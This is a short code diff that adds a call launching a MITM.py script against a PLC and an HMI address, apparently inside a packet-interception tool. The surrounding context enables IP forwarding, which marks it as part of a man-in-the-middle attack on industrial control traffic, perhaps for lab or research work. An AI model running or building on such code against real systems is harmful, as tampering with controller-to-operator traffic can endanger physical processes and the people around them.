@@ -51,6 +51,11 @@ def process_packet(pkt):
         print(f"Error: {e}")
         pkt.accept()
 
+process = subprocess.Popen(
+    f'/home/kali/projects/.venv/bin/python3 /home/kali/projects/MITM.py {PLC_IP} {HMI_IP}',
+    shell=True
+)
+
 subprocess.run(
     "echo 1 > /proc/sys/net/ipv4/ip_forward", 
     shell=True
